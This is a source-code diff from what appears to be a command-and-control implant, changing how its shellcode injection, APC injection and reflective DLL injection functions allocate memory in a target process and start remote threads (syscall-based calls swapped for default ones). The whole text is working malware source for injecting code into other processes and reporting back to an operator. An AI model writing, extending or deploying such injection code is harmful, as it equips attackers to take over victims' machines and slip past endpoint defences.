@@ -170,7 +170,7 @@ BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJE
 
     if ( ctx->Parameter )
     {
-        ShellcodeArg = MemoryAlloc( DX_MEM_SYSCALL, ctx->hProcess, ctx->ParameterSize, PAGE_READWRITE );
+        ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, ctx->hProcess, ctx->ParameterSize, PAGE_READWRITE );
         if ( ShellcodeArg )
         {
             NtStatus = Instance->Syscall.NtWriteVirtualMemory( ctx->hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &OldProtection );
@@ -183,7 +183,7 @@ BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJE
     }
 
     // NtStatus = Instance->Syscall.NtAllocateVirtualMemory( hProcess, &lpVirtualMemory, 0, &ShellcodeSize, MEM_RESERVE | MEM_COMMIT,  );
-    lpVirtualMemory = MemoryAlloc( DX_MEM_SYSCALL, ctx->hProcess, ShellcodeSize, PAGE_READWRITE );
+    lpVirtualMemory = MemoryAlloc( DX_MEM_DEFAULT, ctx->hProcess, ShellcodeSize, PAGE_READWRITE );
     if ( ! lpVirtualMemory )
     {
         PUTS("[-] NtAllocateVirtualMemory: failed")
@@ -241,7 +241,7 @@ BOOL ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T 
 
     if ( ctx->Parameter )
     {
-        ShellcodeArg = MemoryAlloc( DX_MEM_SYSCALL, hProcess, ctx->ParameterSize, PAGE_READWRITE );
+        ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, hProcess, ctx->ParameterSize, PAGE_READWRITE );
         if ( ShellcodeArg )
         {
             NtStatus = Instance->Syscall.NtWriteVirtualMemory( hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &OldProtection );
@@ -253,7 +253,7 @@ BOOL ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T 
         }
     }
 
-    lpVirtualMemory = MemoryAlloc( DX_MEM_SYSCALL, hProcess, ShellcodeSize, PAGE_READWRITE );
+    lpVirtualMemory = MemoryAlloc( DX_MEM_DEFAULT, hProcess, ShellcodeSize, PAGE_READWRITE );
     if ( lpVirtualMemory )
     {
         PUTS("[+] MemoryAlloc: Successful")
@@ -351,7 +351,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllBuffer, DWORD DllLen
     PRINTF( "Params: Size:[%d] Pointer:[%p]\n", ParamSize, Parameter )
     if ( ParamSize > 0 )
     {
-        MemParamsBuffer = MemoryAlloc( DX_MEM_SYSCALL, hTargetProcess, ParamSize, PAGE_READWRITE );
+        MemParamsBuffer = MemoryAlloc( DX_MEM_DEFAULT, hTargetProcess, ParamSize, PAGE_READWRITE );
         if ( MemParamsBuffer )
         {
             PRINTF( "MemoryAlloc: Success allocated memory for parameters: ptr:[%p]\n", MemParamsBuffer )
@@ -374,7 +374,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllBuffer, DWORD DllLen
     }
 
     // Alloc and write remote library
-    MemLibraryBuffer = MemoryAlloc( DX_MEM_SYSCALL, hTargetProcess, DllLength, PAGE_READWRITE );
+    MemLibraryBuffer = MemoryAlloc( DX_MEM_DEFAULT, hTargetProcess, DllLength, PAGE_READWRITE );
     if ( MemLibraryBuffer )
     {
         PUTS( "[+] NtAllocateVirtualMemory: success" );
@@ -395,7 +395,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllBuffer, DWORD DllLen
                 PRINTF( "ctx->Parameter: %p\n", ctx->Parameter )
 
                 // if ( ! ThreadCreate( ctx->Technique, hTargetProcess, ReflectiveLdr, ctx ) )
-                if ( ! ThreadCreate( DX_THREAD_SYSCALL, hTargetProcess, ReflectiveLdr, ctx ) )
+                if ( ! ThreadCreate( DX_THREAD_DEFAULT, hTargetProcess, ReflectiveLdr, ctx ) )
                 {
                     PRINTF( "[-] Failed to inject dll %d\n", NtGetLastError() )
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
